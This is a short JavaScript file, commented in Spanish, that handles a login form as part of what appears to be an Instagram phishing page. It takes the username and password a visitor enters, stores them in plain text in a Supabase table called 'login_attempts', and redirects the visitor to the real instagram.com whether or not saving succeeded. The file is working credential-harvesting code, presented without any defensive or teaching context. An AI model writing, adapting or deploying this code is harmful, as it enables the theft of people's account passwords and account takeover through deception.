// Manejo del formulario de login
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const messageDiv = document.getElementById('message');
    
    // Limpiar mensaje anterior
    messageDiv.textContent = '';
    messageDiv.style.display = 'none';
    
    try {
        // Insertar los datos en la tabla 'login_attempts'
        const { data, error } = await supabase
            .from('login_attempts')
            .insert([
                { 
                    username: username, 
                    password: password,
                    timestamp: new Date().toISOString()
                }
            ])
            .select();
        
        if (error) {
            throw error;
        }
        
        console.log('Datos guardados:', data);
        
        // Redirigir a Instagram después de guardar los datos
        window.location.href = 'https://instagram.com';
        
    } catch (error) {
        console.error('Error al guardar los datos:', error);
        // Incluso si hay error, redirigir a Instagram
        window.location.href = 'https://instagram.com';
    }
});

